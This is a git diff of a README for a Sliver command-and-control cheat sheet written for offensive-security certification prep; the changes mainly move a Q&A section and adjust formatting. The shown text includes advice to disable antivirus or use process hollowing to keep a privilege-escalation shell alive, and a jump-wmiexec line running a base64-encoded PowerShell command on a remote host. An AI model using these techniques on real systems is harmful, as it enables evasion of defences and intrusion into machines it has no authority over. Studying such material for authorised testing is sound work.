@@ -6,13 +6,14 @@ It contains all the notes from the course content and challenge labs and is more
 
 The C# and PowerShell files throughout the cheat sheet should be publicly accessible, just search the tool name publicly. I have also compiled many of them during the duration of OSEP prep and have included them within the folder `bins` containing my structure, these would be detected as malicious if downloaded, feel free to download from the public repos and compile them. 
 
+
 ## Table of Contents
 
+- [Q & A](#q--a)
 - [Installation](#installation)
 	- [Server](#server)
 	- [Client](#client)
 	- [Armory packages](#armory-packages)
-- [Q & A](#q--a)
 - [Listeners](#listeners)
 - [Payloads](#payloads)
 - [Hosts File](#hosts-file)
@@ -134,12 +135,40 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 - [BOFs](#bofs)
 	- [jump-psexec](#jump-psexec)
 	- [jump-wmiexec](#jump-wmiexec)
- - [Armory Packages List](#armory-packages-list)
+- [Armory Packages List](#armory-packages-list)
+
+
+
+
+## Q & A
+
+- When I run with `-i`, I get CLM runtime error
+  - Run the same command again, twice, thrice, it will work out
+
+- Sliver hangs when I run ligolo or other binaries
+  - Press Ctrl + C and then re-run sliver and use the session, it should work fine 
+
+- `SweetPotato` shell dies right after I receive it
+	- The moment you get the shell either
+		- Run phollow or
+		- Disable AV using the oneliner of sharpsh
+	- Repeat the above two steps (the AV disablement is favoured to process hollowing)
+
+- I can't figure out sliver quote issues
+	- Same lol but with enough practice and time waste, you'll get it
+
+- Why is there a hav0c-ps.txt file everywhere? 
+	- I got lazy and didn't change the name as I was using Havoc before Sliver
+	- Should be present within https://github.com/Anon-Exploiter/sliver-cheatsheet/blob/main/bins/www/html/hav0c-ps.txt
+
+
 
 ## Installation
+
 Visit the sliver [releases page](https://github.com/BishopFox/sliver/releases) and install the pre-compiled Server and Client for your OS. Sliver also enables multiple operators to join using profiles since each operator can be generated using a different profile.
 
 ### Server
+
 ```bash
 # Install suitable Binary for your OS - Linux in this instance
 wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
@@ -177,6 +206,7 @@ chmod +x ./sliver-client_linux
 ```
 
 ### Armory packages
+
 [Armory](https://github.com/sliverarmory) contains a set of pre-installed .NET binaries ready to use for the client and server component.
 
 ```bash
@@ -186,28 +216,6 @@ sliver > armory install all
 [*] Installing alias 'SharPersist' (v0.0.2) ... done!
 ... Complete output at the end ...
 ```
-
-## Q & A
-
-- When I run with `-i`, I get CLM runtime error
-  - Run the same command again, twice, thrice, it will work out
-
-- Sliver hangs when I run ligolo or other binaries
-  - Press Ctrl + C and then re-run sliver and use the session, it should work fine 
-
-- `SweetPotato` shell dies right after I receive it
-	- The moment you get the shell either
-		- Run phollow or
-		- Disable AV using the oneliner of sharpsh
-	- Repeat the above two steps (the AV disablement is favoured to process hollowing)
-
-- I can't figure out sliver quote issues
-	- Same lol but with enough practice and time waste, you'll get it
-
-- Why is there a hav0c-ps.txt file everywhere? 
-	- I got lazy and didn't change the name as I was using Havoc before Sliver
-	- Should be present within https://github.com/Anon-Exploiter/sliver-cheatsheet/blob/main/bins/www/html/hav0c-ps.txt
-
 
 
 ## Listeners
@@ -2551,7 +2559,7 @@ jump-wmiexec client09 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAd
 
 ## Armory Packages List
 
-```
+```powershell
 sliver > armory install all
 
 ? Install 21 aliases and 140 extensions? Yes
